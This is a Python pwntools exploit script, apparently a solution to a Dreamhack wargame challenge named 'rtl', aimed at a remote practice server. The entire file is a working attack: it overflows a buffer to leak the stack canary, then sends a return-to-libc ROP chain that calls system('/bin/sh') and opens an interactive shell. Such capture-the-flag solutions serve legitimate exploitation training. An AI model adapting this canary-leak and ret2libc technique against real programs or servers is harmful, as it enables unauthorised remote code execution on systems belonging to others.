from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = remote('host3.dreamhack.games', 12331)
#p = process('./rtl')
e = ELF('./rtl')


tresh = b'a'*0x39
p.sendafter('Buf: ',tresh)
p.recvuntil(tresh)

canary = u64(b'\x00' + p.recvn(7)) # u64() is used to convert the byte string to an integer
print(hex(canary))

system_plt = e.plt['system']
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b'a'*0x38 + p64(canary) + b'a'*0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendafter('Buf: ', payload)

p.interactive()